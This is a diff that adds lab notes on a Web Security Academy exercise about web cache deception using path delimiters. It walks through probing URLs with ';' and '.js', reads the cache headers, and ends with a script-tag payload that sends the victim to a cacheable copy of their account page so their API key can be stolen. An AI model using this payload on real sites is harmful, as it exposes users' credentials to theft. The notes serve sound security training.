@@ -189,3 +189,59 @@ Because delimiters are generally used consistently within each server, you can o
 > Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like {, }, <, and >, and use # to truncate the path.  
 > If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit. 
 
+### PRACTITIONER Lab: Exploiting path delimiters for web cache deception
+There must be 2 servers for the attack to be successful: caching server and origin server.
+The idea is to find discrepancies in the way caching and origin servers treat request url.
+
+For example let's say on our website we have an endpoint:
+```
+https://labid.web-security-academy.net/my-account
+```
+That endpoint returns an html page that contains user's API key (which needs to be stolen to solve the lab)
+
+We need to find discrepancies between url parsing in the origin server and the caching server. So we try to append `aa` at the end of the url:
+```
+https://labid.web-security-academy.net/my-accountaa
+```
+We get 404 not found
+
+Later we try to figure out what are the delimiters in url parsing on the origin server, so we try different delimiters, e.g. we try `;`:
+```
+https://labid.web-security-academy.net/my-account;aa
+```
+And we get 200 OK with the same HTML page
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Server: Apache-Coyote/1.1
+Content-Length: 3833
+```
+
+So when we tried `/my-accountaa` we got 404 but when we tried `/my-account;aa` we got 200 OK. We can conclude that `;` is a path delimiter and the origin server treats `/my-account;aa` as `/my-account`.
+
+Now that we figured out delimiter we need to make sure that our caching server does not use the same delimiter for url path parsing.
+
+Caching servers have caching rules. They may be something like if the request url ends with `.js` (or potentially other extensions) then cache the request
+
+So we try `/my-account;.js` and we get a 200 OK response but this time we get additional caching headers:
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Server: Apache-Coyote/1.1
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Content-Length: 3833
+```
+
+This indicates that the caching server doesn't treat `/my-account;.js` as `/my-account`. It actually treats `/my-account;.js` as `/my-account;.js`, i.e. it treats it as the full path together with `.js` at the end and it caches the response and it ignores the `;` deliminator.
+
+So now we found the discrepancy between origin server and the caching server
+
+To solve the lab craft an exploit and send it to victim to click on it:
+```bash
+<script>document.location = "https://labid.web-security-academy.net/my-account;.js"</script>
+```
+
